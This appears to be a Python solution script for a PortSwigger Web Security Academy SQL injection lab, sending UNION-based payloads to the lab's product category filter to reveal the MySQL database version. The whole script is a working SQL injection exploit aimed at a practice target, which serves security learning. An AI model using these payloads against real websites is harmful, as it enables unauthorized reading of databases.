#!/usr/bin/env python

"""This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

Lab Link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
"""

import requests
import sys

lab_id = '0ab9008d0394f694c1538b2b00e40097' #change based on generated lab page id
base_uri = f"https://{lab_id}.web-security-academy.net/filter?category=" # contains the vulnerable sqli path

query_1 = "'+UNION+SELECT+NULL,NULL%23" # Check for the UNION injection with two null columns. Query formatted for mysql database. '#' character has to be url encoded
uri_1 = base_uri + query_1
r1 = requests.get(uri_1)
if r1.status_code == 200:
    query_2 = "'+UNION+SELECT+@@version,NULL%23" # returns version formatted for ms/mysql database.
    uri_2 = base_uri + query_2
    r2 = requests.get(uri_2)
    if "8.0.29" in r2.text:
        print("solved")
    else: 
        print("nope")
else:
    print("Union query is wrong. Exiting")
    sys.exit(-1)
